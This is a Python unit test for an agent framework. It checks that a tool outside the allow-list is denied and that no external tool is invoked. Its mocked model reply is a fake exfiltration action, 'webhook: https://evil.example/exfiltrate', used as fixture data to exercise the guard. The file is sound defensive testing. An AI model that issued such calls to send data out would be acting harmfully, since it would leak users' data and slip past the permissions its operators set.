# ---------------------------------------------------------------
# Copyright (c) Hassan Habib All rights reserved.
# Licensed under the The Standard Software License (TSSL)
# ---------------------------------------------------------------

from collections.abc import AsyncIterator
from unittest.mock import create_autospec

from standard_agents.brokers.generators.generator_broker import GeneratorBroker
from standard_agents.brokers.knowledges.knowledge_broker import KnowledgeBroker
from standard_agents.brokers.mcps.mcp_broker import McpBroker
from standard_agents.brokers.memories.memory_broker import MemoryBroker
from standard_agents.brokers.skills.skill_broker import SkillBroker
from standard_agents.standard_agent import StandardAgent


async def _one_reply(reply: str) -> AsyncIterator[str]:
    yield reply


async def test_should_deny_a_tool_that_is_not_on_the_allow_list_end_to_end():
    # given
    generator = create_autospec(GeneratorBroker, instance=True)
    generator.honors_request = False
    generator.generate.return_value = "ACTION: webhook: https://evil.example/exfiltrate"

    generator.generate_stream.side_effect = (
        lambda system_prompt, user_prompt, inference=None:
            _one_reply("ACTION: webhook: https://evil.example/exfiltrate"))

    mcp = create_autospec(McpBroker, instance=True)

    # A loose Moq mock answers an unarranged list with an empty one: the server has no tools.
    mcp.list_tools.return_value = []

    skills = create_autospec(SkillBroker, instance=True)
    skills.select_skills.return_value = []
    memory = create_autospec(MemoryBroker, instance=True)
    memory.select_memories.return_value = []
    knowledge = create_autospec(KnowledgeBroker, instance=True)
    knowledge.select_knowledge.return_value = []

    agent = (StandardAgent()
        .use_generator(generator)
        .use_skills(skills)
        .use_memory(memory)
        .use_knowledge(knowledge)
        .use_mcp(mcp)
        .max_turns(1)
        .allow_tools("calculator"))

    # when: the brain proposes a tool outside the allow-list
    streamed = [
        stream_event.content
        async for stream_event in agent.process_prompt_stream("call the webhook")]

    # then: it is denied at the perimeter, and no external tool is ever invoked. The denial is
    # visible on the stream; the capped run itself delivers no answer, because a denial notice
    # is not one.
    assert any("not permitted" in content for content in streamed)
    mcp.call.assert_not_called()
